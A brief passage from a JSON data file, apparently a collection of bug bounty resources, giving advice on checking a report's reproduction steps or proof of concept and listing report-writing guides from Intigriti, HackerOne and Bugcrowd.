it. Follow your own Steps to Reproduce or PoC to ensure that they contain enough details. Examine all the files and code to make sure they work. Resources  Intigrity: How to write a good report HackerOne: Submitting Reports BugCrowd: Reporting a Bug",
    "cat": "red_out",
    "type": "html"
  }
]